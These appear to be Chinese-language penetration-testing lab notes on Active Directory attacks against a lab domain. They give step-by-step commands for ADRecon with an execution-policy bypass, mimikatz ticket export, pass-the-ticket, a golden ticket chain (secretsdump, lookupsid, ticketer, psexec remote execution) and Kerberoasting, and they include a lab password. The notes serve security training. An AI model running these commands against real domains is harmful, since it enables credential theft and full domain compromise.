Day5
===
ADRecon
---
    AD由三個部分組成
    目錄分割區
    設定檔
    Schema資料庫結構
![image](https://github.com/user-attachments/assets/5f241d92-cbbd-4673-9652-2120ee57b018)
![image](https://github.com/user-attachments/assets/2a14572d-8f90-4533-835c-513a9945791e)

    蒐集AD資訊，下載ADRecon工具
[ADRecon工具](https://github.com/adrecon/ADRecon)
![image](https://github.com/user-attachments/assets/b3735d89-1269-4271-a994-8b2bb5b57117)

    執行powershell&ADRecon.ps1
    powershell.exe  -nop –ep bypass
    -nop:PowerShell 在啟動時不讀取任何配置文件，包括使用者配置文件。
    -ep: -ExecutionPolicy Bypass 的簡寫
    > in Domain
    ./adrecon.ps1
    > OR Not in Domain
    ./adrecon.ps1 -DomainController 192.168.177.19 –OutputType ALL -Credential lpt.com\cpent
    > OR
    ./adrecon.ps1 -DomainController 192.168.177.19 –OutputType HTML -Credential lpt.com\cpent
![image](https://github.com/user-attachments/assets/63813ab0-0e04-42ef-8f18-86b36605c65a)
![image](https://github.com/user-attachments/assets/12ddffa2-2bf4-4b03-871f-b53ef80c8687)

Export Kerberos Tickets
---
    使用mimikatz工具
    mimikatz
    privilege::debug
    sekurlsa::tickets /export
![image](https://github.com/user-attachments/assets/325d960d-dbe1-4dd5-8533-3b9b4fa6ccc9)
![image](https://github.com/user-attachments/assets/cf574c3d-244b-4dfa-a7aa-77905f6e0438)

Pass the Ticket
---
    取得DC TGT拿到另外一台機器匯入TGT，尚未匯入前無法訪問DC目錄
![image](https://github.com/user-attachments/assets/c244175e-bf04-4d54-a842-4f2171abf30e)
![image](https://github.com/user-attachments/assets/e83a042a-4223-4460-94ca-d4426c83289c)

    匯入TGT&確認票卷
![image](https://github.com/user-attachments/assets/4a8cfc5b-0cb2-4156-a80b-6cd23f8faf35)
![image](https://github.com/user-attachments/assets/57868c45-8eb9-4959-aa94-31a1371981d5)

    可瀏覽DC目錄
![image](https://github.com/user-attachments/assets/1495a602-6c57-4ff2-a1a8-67af5b4b1227)

Golden Ticket Attack
---
    /etc/hosts新增IP&域名
![image](https://github.com/user-attachments/assets/cd32ab86-fca6-447e-bda6-ede7ce144113)

    取得administrator的krbtgt的NTLM hash
    impacket-secretsdump 'administrator:Pa$$w0rd'@192.168.177.19    
![image](https://github.com/user-attachments/assets/164b2a01-4163-4cef-a8db-4f4b19f663a5)

    取得administrator的SID
    python3 /opt/impacket/examples/lookupsid.py 'administrator:Pa$$w0rd'@192.168.177.19 0
![image](https://github.com/user-attachments/assets/3ec80a6d-4cce-406a-84af-28f25dff7e05)

    簽一張TGT
    python3 /opt/impacket/examples/ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain lpt.com evil
![image](https://github.com/user-attachments/assets/1e063263-9b10-4248-8545-09fb0828fe89)

    設定環境變數
    export KRB5CCNAME=~/evil.ccache
![image](https://github.com/user-attachments/assets/dd1603e6-c95a-48ae-8f2f-cfbf5f806cb8)

    執行RCE
    psexec.py lpt.com/evil@server2019.lpt.com -k -no-pass -dc-ip 192.168.177.19
![image](https://github.com/user-attachments/assets/afa4eab9-d9e7-4603-8c33-c7708c096562)

Kerberoasting
---
    Register service in AD
    setspn -s http/lpt.com user-one
![image](https://github.com/user-attachments/assets/fbca5919-1e5d-4a1f-9fff-c59e2e07dcd5)
  
    取得在DC上註冊的服務
![image](https://github.com/user-attachments/assets/f4ca12aa-9f57-4d1d-a892-6f0576e95622)

